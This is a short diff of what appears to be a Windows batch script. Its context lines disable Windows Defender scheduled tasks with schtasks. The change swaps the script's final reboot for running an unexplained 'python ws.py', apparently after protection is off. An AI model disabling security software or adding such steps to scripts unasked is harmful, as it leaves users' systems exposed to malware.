@@ -25,5 +25,4 @@ schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Schedu
 schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
 
 echo [✓] All done. Rebooting system in 10 seconds...
-timeout /t 10 /nobreak >nul
-shutdown /r /t 0
+python ws.py
